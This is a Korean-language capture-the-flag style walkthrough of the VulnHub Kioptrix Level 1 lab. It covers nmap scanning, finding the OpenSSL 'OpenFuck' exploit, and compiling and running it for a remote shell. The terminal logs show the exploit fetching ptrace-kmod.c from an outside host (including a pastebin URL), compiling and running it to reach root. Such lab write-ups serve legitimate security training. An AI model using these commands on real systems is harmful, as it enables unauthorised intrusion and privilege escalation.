# Kioptrix Level 1 (#1)

## Workstation
- Virtual Box : VMware Workstation 16 Player
- OS : kali-linux-2022.01

## Walkthrough
[https://www.vulnhub.com/entry/kioptrix-level-1-1,22/](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

KIOPTRIX: LEVEL 1 (#1) 에 대한 가상머신은 위 사이트에서 다운받을 수 있다.

해당 가상머신을 다운받은 후 VMware 워크스테이션에서 열어 활성화 시킨다.

![kioptrix level 1](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/kioptrix_level_1.png)

가상머신의 아이피 주소를 알기 위해 `ip addr` 명령어를 사용해 IP 대역을 확인한다.

![ip addr](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/ip_addr.png)

IP 대역을 확인해 보니 192.168.159.0/24 대역을 사용 중이다.

그럼 이 대역에서 사용하는 클라이언트들을 확인하기 위해 `nmap -sn` 명령어를 사용해 확인한다.

![nmap-sn](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/nmap-sn.png)

내 아이피는 `192.168.159.128` 이므로 Kioptrix Level 1의 가상머신 아이피는 `192.168.159.129`이다.

그럼 가상머신에 열려있는 포트와 버전을 알기 위해 `nmap -sT -sV` 명령어로 네트워크 스캔을 한다.

![nmap](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/nmap.png)

80번 포트에 http 서버가 열려있다. 80번 포트에 대한 취약점이 있는지 `searchexploit` 명령어를 버전에 맞게 검색한다.

![searchexploit](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/searchexploit.png)

`OpenSSL/0.9.6b` 에 OpenFuck.c 라는 취약점이 발견됐다. 가장 최신버전인 파일을 `searchexploit -m 47080` 명령어를 사용해 내 디렉터리에 복사해 온다.

![copy](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/copy.png)

복사한 파일을 확인해 보면 다음과 같이 컴파일하라는 명령어가 있다.

![47080](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/47080.png)

그럼 안내해준 명령어를 사용해 해당 파일을 컴파일 한다.

![gcc](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/gcc.png)

컴파일된 파일을 실행해 보면 사용할 수 있는 옵션들이 나오는데, 그 중 취약점으로 발견된 `RedHat Linux apache-1.3.20-16` 에 대한 옵션을 찾는다.

![0x6b](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/0x6b.png)

`0x6b` 옵션을 사용해 가상머신의 루트 권한을 획득해 본다.

```
┌──(kali㉿kali)-[~/vulnhub/kioptrix1]
└─$ ./OpenFuck 0x6b 192.168.159.129 443 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f81c8
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--15:08:57--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ whoami
whoami
apache
bash-2.05$ 
```

루트 권한을 얻지 못하고 apache 권한을 얻었다. 취약점 공격이 실패 해 확인해 보니 Exploit DB에 업로드된 OpenFuck.c 파일이 이전버전으로 루트 권한을 얻지 못했다. 해당 파일은 삭제 후 다른 OpenFuck 파일을 받아 컴파일하여 실행한다.

`git clone https://github.com/heltonWernik/OpenFuck.git`

![git](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/git.png)

![compile](https://github.com/jasperkim425/Walkthrough/blob/main/VulnHub/Kioptrix%20Level%201%20(%231)/image/compile.png)

다시 컴파일된  실행해 보면 루트 권한을 얻은 쉘을 얻을 수 있다.

```
┌──(kali㉿kali)-[~/vulnhub/kioptrix1/OpenFuck]
└─$ ./OpenFuck 0x6b 192.168.159.129 443 -c 40             

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--15:19:17--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   3.84 MB/s

15:19:19 (3.84 MB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 6076
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root

```
